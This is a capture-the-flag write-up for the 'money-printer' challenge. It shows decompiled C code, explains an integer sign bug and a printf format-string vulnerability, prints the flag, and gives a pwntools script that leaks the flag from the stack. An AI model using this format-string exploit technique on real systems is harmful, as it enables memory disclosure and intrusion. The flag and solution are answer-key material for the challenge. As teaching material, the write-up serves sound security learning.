# money-printer
<p align="center">
  <img src="Attachments/Description.png" />
</p>

## FLAG:
`sdctf{d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y}`
#
## Solution
First of all, I decompiled the [executable file](Attachments/money-printer) provided by the challenge

```c
undefined8 main(void)
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    int var_bch;
    int var_b8h;
    uint64_t user_input;
    char *s;
    char *format;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    setbuf(_stdin, 0);
    setbuf(_stdout, 0);
    setbuf(_stderr, 0);
    var_b8h = 100;
    user_input._0_4_ = 0;
    var_bch = 0;
    *(int64_t *)0x0 = fopen("flag.txt", data.00400ad8);
    if (*(int64_t *)0x0 == 0) {
        printf(data.00400af7, "no flag file found!");
        exit(0);
    }
    fgets(&s, 0x2d, stack0xffffffffffffff50);
    while (0 < var_b8h) {
        printf("I have %d dollars, how many of them do you want?\n", var_b8h);
        __isoc99_scanf(data.00400b32, &var_bch);
        getchar();
        if (var_bch < 100) {
            if (var_bch < var_b8h) {
                printf("you can have %d dollars!\n", var_bch);
                var_b8h = var_b8h - var_bch;
                user_input._0_4_ = (uint32_t)user_input + var_bch;
            } else {
                puts("I don\'t have that much!");
            }
        } else {
            puts("you clearly can\'t get that much!");
        }
        if (1000 < (uint32_t)user_input) {
            printf("wow you\'ve printed money out of thin air, you have %u!!! Is there anything you would like to say to the audience?\n"
                   , (uint32_t)user_input);
            fgets(&format, 100, _stdin);
            printf("wow you said: ");
            printf(&format);
            puts("\nthat\'s truly fascinating!");
            exit(0);
        }
    }
    uVar1 = 0;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar1 = __stack_chk_fail();
    }
    return uVar1;
}
```

In the `main` we can see what we have to do to have the flag (that is loaded in the stack):

1. Have more than 1000 dollars.
2. Using format string to read stack.

To get around the first step, since user input is evaluated as an `unsigned`, you can pass `-1` so that it evaluates to the maximum value reachable by an `unsigned int` in C.

To read the flag from the stack I used gdb, locally, to figure out where the flag was loaded and the format string "`%p %p %p %p %p %p %p %p %p %p %p %p`" to understand the offset from which to start to read the flag.

![gdb](Attachments/gdb.png)

So based on the information I found, I wrote the following [script](Attachments/solve.py) to get the flag

```python
from pwn import *

source = "money.sdc.tf"
port = 1337
binary = "./money-printer"

if args.REMOTE:
	r = remote(source, port)
else:
	r = process(binary)

if args.DEBUG:
	context.log_level = 'debug'

r.sendlineafter(b"I have 100 dollars, how many of them do you want?\n", b"-1")

payload = ""
for i in range(10, 16):
	payload += f"%{i}$lx "
log.info(f"{payload = }")

r.sendlineafter(b"the audience?\n", payload.encode())

flag_enc = r.recvline().decode().strip().split()[3:]
flag = ""
for block in flag_enc:
	flag += unhex(block).decode()[::-1]
flag += "}"

log.success(f"{flag = }")

r.close()
```